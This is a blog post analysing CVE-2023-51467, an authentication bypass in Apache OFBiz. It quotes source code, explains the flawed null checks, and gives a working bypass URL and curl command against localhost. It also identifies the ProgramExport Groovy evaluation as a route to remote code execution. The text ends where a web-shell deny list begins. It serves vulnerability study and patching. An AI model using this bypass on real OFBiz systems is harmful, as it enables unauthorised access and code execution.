---
author: AnirudhAnand
layout: post
title: Analysing CVE-2023-51467 - Apache OFBiz Authentication bypass to Remote Code Execution
categories:
- java
summary: This article aims to explore the details of CVE-2023-51467 and explain the process of constructing an exploit leading to Remote Code Execution.
description: This article aims to explore the details of CVE-2023-51467 and explain the process of constructing an exploit leading to Remote Code Execution.
---

## Introduction

Apache OFBiz is an open-source Enterprise Resource Planning (ERP) solution featuring a suite of applications designed for streamlining and automating various business processes. Notably, a recent discovery has unveiled a critical authentication bypass vulnerability within Apache OFBiz, ultimately exposing the system to Remote Code Execution (CVE-2023-51467). This article aims to explore the details of this vulnerability and explain the process of constructing an exploit leading to Remote Code Execution.

## Installing and Configuring OFBiz

Download the [18.12.05](https://github.com/apache/ofbiz-framework/releases/tag/release18.12.05){:target="_blank"} release from the official [Apache OFBiz Github](https://github.com/apache/ofbiz-framework/releases/tag/release18.12.05){:target="_blank"} repository and proceed with the local installation. For the purpose of this article, I will be using the Intellij IDEA Community Edition to navigate through the codebase.

<div align='center'><img src="/images/2024/apache_ofbiz_directories.png" alt="Apache OFBiz Directories" height="450"/></div>

Exploring through the directories we can see the `docs` directory which usually contain interesting information including details on project structure, architecture/design and the developer manual. This is instrumental in gaining a good understanding of the core framework. Notably, within the 'docs' directory, the `developer-manual.adoc` file contains great insights into the project's structure

The base directory structure of Apache OFBiz is organized as follows:

{% highlight bash lineos %}
Apache OFBiz
├── framework/              - Core framework of OFBiz
    ├── base                - Fundamental framework components and services.
    ├── common              - Resources and utilities used throughout the framework
    ├── entity              - Entity engine and data access
    ├── webapp              - Web application components
    ├── webtools            - Contains webtools
    ├── component-load.xml  - 
├── applications/           - Various app components with each having subdirectory containing configuration files, entity definitions etc ...
├── runtime/                - Runtime config files, logs, cache
├── plugins/                - External plugins to extend framework abilities

{%endhighlight%}

A basic unit in Apache OFBiz is called `component`. A component is at a minimum a folder with a file inside of it called `ofbiz-component.xml`. As per the documentation, a typical component has the following directory structure.

{% highlight bash lineos %}

component-name-here/
├── config/              - Properties and translation labels (i18n)
├── data/                - XML data to load into the database
├── entitydef/           - Defined database entities
├── groovyScripts/       - A collection of scripts written in Groovy
├── minilang/            - A collection of scripts written in minilang (deprecated)
├── ofbiz-component.xml  - The OFBiz main component configuration file
├── servicedef           - Defined services.
├── src/
    ├── docs/            - component documentation source
    └── main/java/       - java source code
    └── test/java/       - java unit-tests
├── testdef              - Defined integration-tests
├── webapp               - One or more Java webapps including the control servlet
└── widget               - Screens, forms, menus and other widgets

{%endhighlight%}

An interesting thing to note here is the `groovyScripts` directory containing a collection of scripts written in Groovy. If we can edit or trigger a Groovy file with the contents we control, post authentication bypass, we will be able to achieve remote code execution.

## Understanding the patch

OFBiz has fixed the vulnerability with a very [simple patch](https://github.com/apache/ofbiz-framework/commit/d8b097f6717a4004acf023dfe929e0e41ad63faa){:target="_blank"} which is as simple as replacing direct null checks with `UtilValidate.isEmpty()` function in the file `LoginWorker.java` inside webapp/control directory. So the main file to look for the vulnerability is `org.apache.ofbiz.webapp.control.LoginWorker#checkLogin`

## Exploring checkLogin()

Let's go through the `checkLogin()` code line by line to understand how authentication is handled:

**File**: *ofbiz-framework-release18.12.05/framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/LoginWorker.java*

{% highlight java lineos %}
323:     public static String checkLogin(HttpServletRequest request, HttpServletResponse response) {
324:         GenericValue userLogin = checkLogout(request, response);
325:         // have to reget this because the old session object will be invalid
326:         HttpSession session = request.getSession();
327: 
328:         String username = null;
329:         String password = null;
330:         String token = null;
331: 
332:         if (userLogin == null) {
333:             // check parameters
334:             username = request.getParameter("USERNAME");
335:             password = request.getParameter("PASSWORD");
336:             token = request.getParameter("TOKEN");
337:             // check session attributes
338:             if (username == null) username = (String) session.getAttribute("USERNAME");
339:             if (password == null) password = (String) session.getAttribute("PASSWORD");
340:             if (token == null) token = (String) session.getAttribute("TOKEN");
{%endhighlight%}

1. The `checkLogin()` method starts by calling another method `checkLogout()` to verify if the user has logged out. The result is stored in a GenericValue object named userLogin. 

2. The code then retrieves the HttpSession object which is used to manage session-specific information for the user.

3. Three variables namely `username`, `password`, and `token` are initialized to `null`. These variables will be used to store user credentials.

4. If the userLogin is `null`, it implies that the user has not logged in. The code proceeds to check request parameters (USERNAME, PASSWORD, and TOKEN) and session attributes for the user's credentials.

Can we spot a bug in the above code ? 

What happens if we send a GET request with the parameters namely `username`, `password` and `token` but without a value? All the parameters gets defined but empty, which means it's `not null` but `empty` !

Ex: `http://localhost:8443/something?USERNAME&PASSWORD`

**File**: *ofbiz-framework-release18.12.05/framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/LoginWorker.java*
{% highlight java lineos %}
  342:     // in this condition log them in if not already; if not logged in or can't log in, save parameters and return error
  343:     if (username == null
  344:             || (password == null && token == null)
  345:             || "error".equals(login(request, response))) {
  346: 
  347:         // make sure this attribute is not in the request; this avoids infinite recursion when a login by less stringent criteria (like not checkout the hasLoggedOut field) passes; this is not a normal circumstance but can happen with custom code or in funny error situations when the userLogin service gets the userLogin object but runs into another problem and fails to return an error
  348:         request.removeAttribute("_LOGIN_PASSED_");
  349: 
  350:         // keep the previous request name in the session
  351:         session.setAttribute("_PREVIOUS_REQUEST_", request.getPathInfo());
  352: 
  353:         // NOTE: not using the old _PREVIOUS_PARAMS_ attribute at all because it was a security hole as it was used to put data in the URL (never encrypted) that was originally in a form field that may have been encrypted
  354:         // keep 2 maps: one for URL parameters and one for form parameters
  355:         Map<String, Object> urlParams = UtilHttp.getUrlOnlyParameterMap(request);
  356:         if (UtilValidate.isNotEmpty(urlParams)) {
  357:             session.setAttribute("_PREVIOUS_PARAM_MAP_URL_", urlParams);
  358:         }
  359:         Map<String, Object> formParams = UtilHttp.getParameterMap(request, urlParams.keySet(), false);
  360:         if (UtilValidate.isNotEmpty(formParams)) {
  361:             session.setAttribute("_PREVIOUS_PARAM_MAP_FORM_", formParams);
  362:         }
  363: 
  364:         //if (Debug.infoOn()) Debug.logInfo("checkLogin: PathInfo=" + request.getPathInfo(), module);
  365: 
  366:         return "error";
  367:     }
  368: }
{%endhighlight%}
{:start="5"}

5. If any of the required credentials (username, password, or token) is equal to `null` or if the login method returns an `error` status, the code performs the following actions:
	1. Removes an attribute (*_LOGIN_PASSED_*) and sets the *_PREVIOUS_REQUEST_* attribute in the session, storing the path of the request.
	3. Stores URL parameters and form parameters in separate maps (*_PREVIOUS_PARAM_MAP_URL_* and *_PREVIOUS_PARAM_MAP_FORM_*) in the session.
	4. Returns the string `error`.

## Exploring login() & bypassing authentication

One of the thing we can conclude from `checkLogin()` is, if username, password and token is `not null`, then if the `login()` methods returns anything other than `error` as the string, then we will successfully authenticate with the application. So let's explore `login()` and see if there is a way in which we can force it to return any other string other than `error`.

**File**: *ofbiz-framework-release18.12.05/framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/LoginWorker.java*
{% highlight java lineos %}
  391:     public static String login(HttpServletRequest request, HttpServletResponse response) {
  392:         HttpSession session = request.getSession();
  393:         
  394:         // Prevent session fixation by making Tomcat generate a new jsessionId (ultimately put in cookie). 
  395:         if (!session.isNew()) {  // Only do when really signing in. 
  396:             request.changeSessionId();
  397:         }
  398:         
  399:         Delegator delegator = (Delegator) request.getAttribute("delegator");
  400:         String username = request.getParameter("USERNAME");
  401:         String password = request.getParameter("PASSWORD");
  402:         String token = request.getParameter("TOKEN");
  403:         String forgotPwdFlag = request.getParameter("forgotPwdFlag");
  404: 
  405:         // password decryption
  406:         EntityCrypto entityDeCrypto = null;
  407:         try {
  408:             entityDeCrypto = new EntityCrypto(delegator, null);
  409:         } catch (EntityCryptoException e1) {
  410:             Debug.logError(e1.getMessage(), module);
  411:         }
  412:         
  413:         if(entityDeCrypto != null && "true".equals(forgotPwdFlag)) {
  414:             try {
  415:                 Object decryptedPwd = entityDeCrypto.decrypt(keyValue, ModelField.EncryptMethod.TRUE, password);
  416:                 password = decryptedPwd.toString();
  417:             } catch (GeneralException e) {
  418:                 Debug.logError(e, "Current Password Decryption failed", module);
  419:             }
  420:         }
  421: 
  422:         if (username == null) username = (String) session.getAttribute("USERNAME");
  423:         if (password == null) password = (String) session.getAttribute("PASSWORD");
  424:         if (token == null) token = (String) session.getAttribute("TOKEN");
{%endhighlight%}

1. The method starts with retrieving the delegator, username, password, token, and a flag indicating whether the password is being reset (`forgotPwdFlag`) from request parameters.

2. If the `forgotPwdFlag` is set to `true`, it attempts to decrypt the password using an EntityCrypto instance. If any of the parameters (username, password, or token) is missing from the request, it attempts to retrieve them from the session attributes.

{% highlight java lineos %}
  426:         // allow a username and/or password in a request attribute to override the request parameter or the session attribute; this way a preprocessor can play with these a bit...
  427:         if (UtilValidate.isNotEmpty(request.getAttribute("USERNAME"))) {
  428:             username = (String) request.getAttribute("USERNAME");
  429:         }
  430:         if (UtilValidate.isNotEmpty(request.getAttribute("PASSWORD"))) {
  431:             password = (String) request.getAttribute("PASSWORD");
  432:         }
  433:         if (UtilValidate.isNotEmpty(request.getAttribute("TOKEN"))) {
  434:             token = (String) request.getAttribute("TOKEN");
  435:         }
  436: 
  437:         List<String> unpwErrMsgList = new LinkedList<String>();
  438:         if (UtilValidate.isEmpty(username)) {
  439:             unpwErrMsgList.add(UtilProperties.getMessage(resourceWebapp, "loginevents.username_was_empty_reenter", UtilHttp.getLocale(request)));
  440:         }
  441:         if (UtilValidate.isEmpty(password) && UtilValidate.isEmpty(token)) {
  442:             unpwErrMsgList.add(UtilProperties.getMessage(resourceWebapp, "loginevents.password_was_empty_reenter", UtilHttp.getLocale(request)));
  443:         }
  444:         boolean requirePasswordChange = "Y".equals(request.getParameter("requirePasswordChange"));
  445:         if (!unpwErrMsgList.isEmpty()) {
  446:             request.setAttribute("_ERROR_MESSAGE_LIST_", unpwErrMsgList);
  447:             return  requirePasswordChange ? "requirePasswordChange" : "error";
  448:         }
{%endhighlight%}

{:start="3"}
3. The code allows the username, password, and token to be overridden by values set in request attributes.

4. It checks for missing `username` or `password` or `token` and populates an error message list named `unpwErrMsgList`. If errors are present, it sets the error messages in the request attribute and returns either `requirePasswordChange` or `error`, depending on the value of `requirePasswordChange` in the request parameters.

This is precisely what we need, if we explicitly set the value of `requirePasswordChange` to `Y` and set `username` as well as `password` to be empty, the login() function returns `requirePasswordChange` rather than returning `error` which leads to the success path of the code !

## Triggering the Vulnerability:

In order to trigger the vulnerability, we first need to understand the architecture of the application and see how we can trigger the groovyScript after bypassing authentication, essentially getting RCE.

### Architecture

From the docs directory, inside the developer manual, we can see an architecture diagram explaining how a request gets routed through OFBiz.
<div align='center'><img src="/images/2024/ofbiz-architecture.png" alt="Apache OFBiz Architecture" width="750"/></div>


Reading further through the documentation, we can see something interesting:

> The Java Servlet Container (tomcat) re-routes incoming requests through web.xml to a special OFBiz servlet called the control servlet. The control servlet for each OFBiz component is defined in controller.xml under the webapp folder. The main configuration for routing happens in controller.xml. The purpose of this file is to map requests to responses.

So essentially OFBiz uses Apache tomcat as it's core webserver which re-reoutes incoming requests through the `web.xml` to the control servlet. Each component's control server is defined in `controller.xml`, a central configuration file that defines request handlers, which are responsible for processing incoming requests. So in-order to fully understand how request mapping works, we need to look at 3 xml files, namely `ofbiz-component.xml`, `web.xml` and `controller.xml`. Let's take an example `/framework/webtools` to understand this:

### ofbiz-component.xml

Let's explore the `ofbiz-component.xml` file:

**File**: *ofbiz-framework-release18.12.05/framework/webtools/ofbiz-component.xml*
{% highlight xml lineos %}
30:     <webapp name="webtools"
31:         title="WebTools"
32:         position="12"
33:         server="default-server"
34:         location="webapp/webtools"
35:         base-permission="OFBTOOLS,WEBTOOLS"
36:         mount-point="/webtools"/>
{%endhighlight%}

So we can conclude that the mount-point to access the framework's webtools directory is to hit `/webtools`. 

### web.xml

Let's explore the `web.xml` file, specifically the control servlet mapping:

**File**: *ofbiz-framework-release18.12.05/framework/webtools/webapp/webtools/WEB-INF/web.xml*
{% highlight xml lineos %}
102:     <servlet>
103:         <description>Main Control Servlet</description>
104:         <display-name>ControlServlet</display-name>
105:         <servlet-name>ControlServlet</servlet-name>
106:         <servlet-class>org.apache.ofbiz.webapp.control.ControlServlet</servlet-class>
107:         <load-on-startup>1</load-on-startup>
108:     </servlet>
109:     <servlet-mapping>
110:         <servlet-name>ControlServlet</servlet-name>
111:         <url-pattern>/control/*</url-pattern>
112:     </servlet-mapping>
{%endhighlight%}

* `servlet-name` specifies a name for the servlet, in this case, `ControlServlet`
* `servlet-class` specifies the fully qualified class name of the control servlet (`org.apache.ofbiz.webapp.control.ControlServlet`).
* `url-pattern` defines the URL pattern to which the servlet is mapped. Here, it's /control/*, meaning that the control servlet will handle requests with URLs starting with `/control/`.

So this means the request mapping currently looks like `/webtools/control`.

### controller.xml

Let's explore the `controller.xml` file:

**File**: *ofbiz-framework-release18.12.05/framework/webtools/webapp/webtools/WEB-INF/controller.xml*
{% highlight xml lineos %}
65:     <request-map uri="ping">
66:         <security auth="true"/>
67:         <event type="service" invoke="ping"/>
68:         <response name="error" type="view" value="ping"/>
69:         <response name="success" type="view" value="ping"/>
70:     </request-map>
.
.
419:     <request-map uri="ProgramExport">
420:         <security https="true" auth="true"/>
421:         <response name="success" type="view" value="ProgramExport"/>
422:         <response name="error" type="view" value="ProgramExport"/>
423:     </request-map>

{%endhighlight%}

From the above file, 

* The `request-map` elements define mappings for specific URIs namely `ping` in this case.
* The `security` element specifies security-related attributes. `auth=true` means authentication is mandatory for accessing the `/ping` endpoint.
* The `event` element defines the event to be triggered when the specified URI is accessed.
* The `response` element specifies the response to be returned.

So it's clear that in order to hit the `/ping` endpoint, we would need to be authenticated and hit the following API endpoint `/webtools/control/ping`. Firing up the browser and visiting [https://localhost:8443/webtools/control/ping](https://localhost:8443/webtools/control/ping){:target="_blank"} will redirect us to the login page. 

Let's go deeper to understand how `controller.xml` is being parsed. Grepping through the source code for controller.xml, we can see some interesting result:

{% highlight bash lineos %}
grep -r "controller.xml" . --include "*.java"
{%endhighlight%}

The result of the above command will give us a list of all java files who has controller.xml as a string inside it.

{% highlight bash lineos %}
./framework/widget/src/main/java/org/apache/ofbiz/widget/renderer/ScreenRenderer.java:     * @param combinedName A combination of the resource name/location for the screen XML file and the name of the screen within that file, separated by a pound sign ("#"). This is the same format that is used in the view-map elements on the controller.xml file.
./framework/widget/src/main/java/org/apache/ofbiz/widget/WidgetWorker.java:                    Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);
./framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/ConfigXMLReader.java:    public static final String controllerXmlFileName = "/WEB-INF/controller.xml";
./framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/ConfigXMLReader.java:                // find controller.xml file with webappMountPoint + "/WEB-INF" in the path
./framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/ConfigXMLReader.java:            // look through all controller.xml files and find those with the request-uri referred to by the target
./framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/RequestHandler.java:            // FIXME: controller.xml errors should throw an exception.
./framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/RequestHandler.java:            Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);
./framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/RequestHandler.java:            // FIXME: controller.xml errors should throw an exception.
./framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/RequestHandler.java:            Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);
./framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/RequestHandler.java:            Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);
./framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/RequestHandler.java:            Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);
./framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/RequestHandler.java:            Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);
./framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/RequestHandler.java:            Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);
./framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/RequestHandler.java:                // If we can't read the controller.xml file, then there is no point in continuing.
./framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/RequestHandler.java:                Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);
./framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/RequestHandler.java:                // If we can't read the controller.xml file, then there is no point in continuing.
./framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/RequestHandler.java:                Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);
./framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/RequestHandler.java:            Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);
./framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/RequestHandler.java:                Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);
./framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/RequestHandler.java:                Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);
./framework/webtools/src/main/java/org/apache/ofbiz/webtools/artifactinfo/ArtifactInfoFactory.java:            Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);
./framework/webtools/src/main/java/org/apache/ofbiz/webtools/artifactinfo/ArtifactInfoFactory.java:            Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);
./framework/webtools/src/main/java/org/apache/ofbiz/webtools/artifactinfo/ControllerRequestArtifactInfo.java:        if (location.endsWith("/WEB-INF/controller.xml")) {
./framework/webtools/src/main/java/org/apache/ofbiz/webtools/artifactinfo/ControllerViewArtifactInfo.java:        if (location.endsWith("/WEB-INF/controller.xml")) {
./applications/product/src/main/java/org/apache/ofbiz/product/category/SeoContextFilter.java:            Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);
{%endhighlight%}

From the result, we can see some interesting files named `ConfigXMLReader.java` and `RequestHandler.java` which does parsing of controller.xml. Let's look into these files deeper and see how it's parsing the file and handle incoming requests.

**File**: *ofbiz-framework-release18.12.05/framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/ConfigXMLReader.java*
{% highlight java lineos %}
62:     public static final String module = ConfigXMLReader.class.getName();
63:     public static final String controllerXmlFileName = "/WEB-INF/controller.xml";
.
.
153:     public static URL getControllerConfigURL(ServletContext context) {
154:         try {
155:             return context.getResource(controllerXmlFileName);
156:         } catch (MalformedURLException e) {
157:             Debug.logError(e, "Error Finding XML Config File: " + controllerXmlFileName, module);
158:             return null;
159:         }
160:     }
.
.
458:     public static class RequestMap {
459:         public String uri;
460:         public String method;
461:         public boolean edit = true;
462:         public boolean trackVisit = true;
463:         public boolean trackServerHit = true;
464:         public String description;
465:         public Event event;
466:         public boolean securityHttps = true;
467:         public boolean securityAuth = false;
468:         public boolean securityCert = false;
469:         public boolean securityExternalView = true;
470:         public boolean securityDirectRequest = true;
471:         public Map<String, RequestResponse> requestResponseMap = new HashMap<String, RequestResponse>();
472:         public Metrics metrics = null;
473: 
474:         public RequestMap(Element requestMapElement) {
475:             // Get the URI info
476:             this.uri = requestMapElement.getAttribute("uri");
477:             this.method = requestMapElement.getAttribute("method");
478:             this.edit = !"false".equals(requestMapElement.getAttribute("edit"));
479:             this.trackServerHit = !"false".equals(requestMapElement.getAttribute("track-serverhit"));
480:             this.trackVisit = !"false".equals(requestMapElement.getAttribute("track-visit"));
481:             // Check for security
482:             Element securityElement = UtilXml.firstChildElement(requestMapElement, "security");
483:             if (securityElement != null) {
484:                 if (!UtilProperties.propertyValueEqualsIgnoreCase("url", "no.http", "Y")) {
485:                     this.securityHttps = "true".equals(securityElement.getAttribute("https"));
486:                 } else {
487:                     String httpRequestMapList = UtilProperties.getPropertyValue("url", "http.request-map.list");
488:                     if (UtilValidate.isNotEmpty(httpRequestMapList)) {
489:                         List<String> reqList = StringUtil.split(httpRequestMapList, ",");
490:                         if (reqList.contains(this.uri)) {
491:                             this.securityHttps = "true".equals(securityElement.getAttribute("https"));
492:                         }
493:                     }
494:                 }
495:                 this.securityAuth = "true".equals(securityElement.getAttribute("auth"));
496:                 this.securityCert = "true".equals(securityElement.getAttribute("cert"));
497:                 this.securityExternalView = !"false".equals(securityElement.getAttribute("external-view"));
498:                 this.securityDirectRequest = !"false".equals(securityElement.getAttribute("direct-request"));
499:             }
500:             // Check for event
501:             Element eventElement = UtilXml.firstChildElement(requestMapElement, "event");
502:             if (eventElement != null) {
503:                 this.event = new Event(eventElement);
504:             }
505:             // Check for description
506:             this.description = UtilXml.childElementValue(requestMapElement, "description");
507:             // Get the response(s)
508:             for (Element responseElement : UtilXml.childElementList(requestMapElement, "response")) {
509:                 RequestResponse response = new RequestResponse(responseElement);
510:                 requestResponseMap.put(response.name, response);
511:             }
512:             // Get metrics.
513:             Element metricsElement = UtilXml.firstChildElement(requestMapElement, "metric");
514:             if (metricsElement != null) {
515:                 this.metrics = MetricsFactory.getInstance(metricsElement);
516:             }
517:         }
518:     }
{%endhighlight%}

So configXMLReader.java parses the `/WEB-INF/controller.xml` and uses the RequestMap class which represents mapping for handling specific HTTP requests. As you can see, if `auth=true` is set, then inside the RequestMap object, `this.securityAuth` is set to true. Now let's look at the RequestHandler.java:

**File**: *ofbiz-framework-release18.12.05/framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/RequestHandler.java*
{% highlight java lineos %}
158:     private RequestHandler(ServletContext context) {
159:         // init the ControllerConfig, but don't save it anywhere, just load it into the cache
160:         this.controllerConfigURL = ConfigXMLReader.getControllerConfigURL(context);
161:         try {
162:             ConfigXMLReader.getControllerConfig(this.controllerConfigURL);
163:         } catch (WebAppConfigurationException e) {
164:             // FIXME: controller.xml errors should throw an exception.
165:             Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);
166:         }
167:         this.viewFactory = new ViewFactory(context, this.controllerConfigURL);
168:         this.eventFactory = new EventFactory(context, this.controllerConfigURL);
169: 
170:         this.trackServerHit = !"false".equalsIgnoreCase(context.getInitParameter("track-serverhit"));
171:         this.trackVisit = !"false".equalsIgnoreCase(context.getInitParameter("track-visit"));
172:         
173:         hostHeadersAllowed = UtilMisc.getHostHeadersAllowed();
174: 
175:     }
.
.
240:     public void doRequest(HttpServletRequest request, HttpServletResponse response, String chain,
241:             GenericValue userLogin, Delegator delegator) throws RequestHandlerException, RequestHandlerExceptionAllowExternalRequests {
242: 
243:         if (!hostHeadersAllowed.contains(request.getServerName())) {
244:             Debug.logError("Domain " + request.getServerName() + " not accepted to prevent host header injection."
245:                     + " You need to set host-headers-allowed property in security.properties file.", module);
246:             throw new RequestHandlerException("Domain " + request.getServerName() + " not accepted to prevent host header injection."
247:                     + " You need to set host-headers-allowed property in security.properties file.");
248:         }
249:
250:         final boolean throwRequestHandlerExceptionOnMissingLocalRequest = EntityUtilProperties.propertyValueEqualsIgnoreCase(
251:                 "requestHandler", "throwRequestHandlerExceptionOnMissingLocalRequest", "Y", delegator);
252:         long startTime = System.currentTimeMillis();
253:         HttpSession session = request.getSession();
254: 
255:         // Parse controller config.
256:         try {
257:             ccfg = new ControllerConfig(getControllerConfig());
258:         } catch (WebAppConfigurationException e) {
259:             Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);
260:             throw new RequestHandlerException(e);
261:         }
262: 
263:         // workaround if we are in the root webapp
264:         String cname = UtilHttp.getApplicationName(request);
265: 
266:         // Grab data from request object to process
267:         String defaultRequestUri = RequestHandler.getRequestUri(request.getPathInfo());
268: 
269:         String requestMissingErrorMessage = "Unknown request ["
270:                 + defaultRequestUri
271:                 + "]; this request does not exist or cannot be called directly.";
272: 
273:         String path = request.getPathInfo();
274:         String requestUri = getRequestUri(path);
275:         String overrideViewUri = getOverrideViewUri(path);
276: 
277:         Collection<RequestMap> rmaps = resolveURI(ccfg, request);
278:         if (rmaps.isEmpty()) {
.
.
{%endhighlight%}
`doRequest()` is the major function which handles the incoming HTTP Request. 

* The code starts with incoming request's ServerName (host header) is in the hostHeadersAllowed list. If not, it logs an error and throws a RequestHandlerException.

* It then parses the `controller.xml` file to obtain the configuration (`ControllerConfig`) and sets up variables, such as the application name (cname), default request URI, and paths. A great way to debug how all these variables play a role is to setup a breakpoint at the `doRequest()` function and execute line by line printing variables and values. 

<div align='center'><img src="/images/2024/apache_ofbiz_runtime_debugging.png" alt="Apache OFBiz runtime debugging" width="750"/></div>

* Further down, it checks if the resolved request maps (`rmaps`) collection is empty and then proceeds to handle the HTTP method.

We can continue down this path until we find `securityAuth` which triggers the login flow:

**File**: *ofbiz-framework-release18.12.05/framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/RequestHandler.java*
{% highlight java lineos %}
482:   if (requestMap.securityAuth) {
483:       // Invoke the security handler
484:       // catch exceptions and throw RequestHandlerException if failed.
485:       if (Debug.verboseOn()) Debug.logVerbose("[RequestHandler]: AuthRequired. Running security check. " + showSessionId(request), module);
486:       ConfigXMLReader.Event checkLoginEvent = ccfg.getRequestMapMap().getFirst("checkLogin").event;
487:       String checkLoginReturnString = null;
488: 
489:       try {
490:           checkLoginReturnString = this.runEvent(request, response, checkLoginEvent, null, "security-auth");
491:       } catch (EventHandlerException e) {
492:           throw new RequestHandlerException(e.getMessage(), e);
493:       }
494:       if (!"success".equalsIgnoreCase(checkLoginReturnString)) {
495:           // previous URL already saved by event, so just do as the return says...
496:           eventReturn = checkLoginReturnString;
497:           // if the request is an ajax request we don't want to return the default login check
498:           if (!"XMLHttpRequest".equals(request.getHeader("X-Requested-With"))) {
499:               requestMap = ccfg.getRequestMapMap().getFirst("checkLogin");
500:           } else {
501:               requestMap = ccfg.getRequestMapMap().getFirst("ajaxCheckLogin");
502:           }
503:       }
504:   } else {
505:       String[] loginUris = EntityUtilProperties.getPropertyValue("security", "login.uris", delegator).split(",");
506:       boolean removePreviousRequest = true;
507:       for (int i = 0; i < loginUris.length; i++) {
508:           if (requestUri.equals(loginUris[i])) {
509:              removePreviousRequest = false;
510:           }
511:       }
512:       if (removePreviousRequest) {
513:           // Remove previous request attribute on navigation to non-authenticated request
514:           request.getSession().removeAttribute("_PREVIOUS_REQUEST_");
515:       }
516:   }
{%endhighlight%}

* The code checks if `requestMap.securityAuth` is true, if so, it invokes a security handler named `checkLogin()`. 

* The return value from the `checkLogin()` event is stored in `checkLoginReturnString` and if the return value is not `success` (case-insensitive), it indicates authentication failure. 

This means if we are able to return `success` for checkLogin(), our request will continue ! We have already seen how to bypass the authentication in the first part of this article :)

Let's try and access the same path but this time using the authentication bypass we did above: <a href="https://localhost:8443/webtools/control/ping?USERNAME&PASSWORD=&requirePasswordChange=Y">https://localhost:8443/webtools/control/ping?USERNAME&PASSWORD=&requirePasswordChange=Y</a>

{% highlight bash lineos %}
curl --insecure "https://localhost:8443/webtools/control/ping?USERNAME&PASSWORD=&requirePasswordChange=Y"
{%endhighlight%}

This time, rather than going to login page, the application will return `PONG` confirming that we have bypassed the authentication successfully !

## Remote Code Execution

At the beginning of this article, we noticed `groovyScripts` directory, let's explore the directory and see if it can help us getting RCE.

**File**: *ofbiz-framework-release18.12.05/framework/webtools/groovyScripts/entity/ProgramExport.groovy*
{% highlight java lineos %}
   31: String groovyProgram = null
   32: recordValues = []
   33: errMsgList = []
   34: 
   35: if (!parameters.groovyProgram) {
   36:     groovyProgram = '''
   37: // Use the List variable recordValues to fill it with GenericValue maps.
   38: // full groovy syntaxt is available
   39: 
   40: import org.apache.ofbiz.entity.util.EntityFindOptions
   41: 
   42: // example:
   43: 
   44: // find the first three record in the product entity (if any)
   45: EntityFindOptions findOptions = new EntityFindOptions()
   46: findOptions.setMaxRows(3)
   47: 
   48: List products = delegator.findList("Product", null, null, null, findOptions, false)
   49: if (products != null) {
   50:     recordValues.addAll(products)
   51: }
   52: 
   53: 
   54: '''
   55:     parameters.groovyProgram = groovyProgram
   56: } else {
   57:     groovyProgram = parameters.groovyProgram
   58: }
{%endhighlight%}

The program starts with checking if a parameter named `groovyProgram` exists, if not a default value is provided.

**File**: *ofbiz-framework-release18.12.05/framework/webtools/groovyScripts/entity/ProgramExport.groovy*
{% highlight java lineos %}
   71: ClassLoader loader = Thread.currentThread().getContextClassLoader()
   72: def shell = new GroovyShell(loader, binding, configuration)
   73: 
   74: if (UtilValidate.isNotEmpty(groovyProgram)) {
   75:     try {
   76:         if (!org.apache.ofbiz.security.SecuredUpload.isValidText(groovyProgram,["import"])) {
   77:             request.setAttribute("_ERROR_MESSAGE_", "Not executed for security reason")
   78:             return
   79:         }
   80:         shell.parse(groovyProgram)
   81:         shell.evaluate(groovyProgram)
   82:         recordValues = shell.getVariable("recordValues")
   83:         xmlDoc = GenericValue.makeXmlDocument(recordValues)
   84:         context.put("xmlDoc", xmlDoc)
   85:     } catch(MultipleCompilationErrorsException e) {
   86:         request.setAttribute("_ERROR_MESSAGE_", e)
   87:         return
   88:     } catch(groovy.lang.MissingPropertyException e) {
   89:         request.setAttribute("_ERROR_MESSAGE_", e)
   90:         return
   91:     } catch(IllegalArgumentException e) {
   92:         request.setAttribute("_ERROR_MESSAGE_", e)
   93:         return
   94:     } catch(NullPointerException e) {
   95:         request.setAttribute("_ERROR_MESSAGE_", e)
   96:         return
   97:     } catch(Exception e) {
   98:         request.setAttribute("_ERROR_MESSAGE_", e)
   99:         return
  100:     }
  101: }
{%endhighlight%}

A `groovyShell` is initialised and eventually the parameter `groovyProgram` is passed onto groovy shell, effectively getting our code executed. An interesting thing to note is the usage of `org.apache.ofbiz.security.SecuredUpload.isValidText(groovyProgram,["import"])`, which is essentially taking our parameter and along with a second argument namely string "import".

**File**: *ofbiz-framework-release18.12.05/framework/security/src/main/java/org/apache/ofbiz/security/SecuredUpload.java*
{% highlight java lineos %}
100:   private static final List<String> DENIEDWEBSHELLTOKENS = deniedWebShellTokens();
.
.
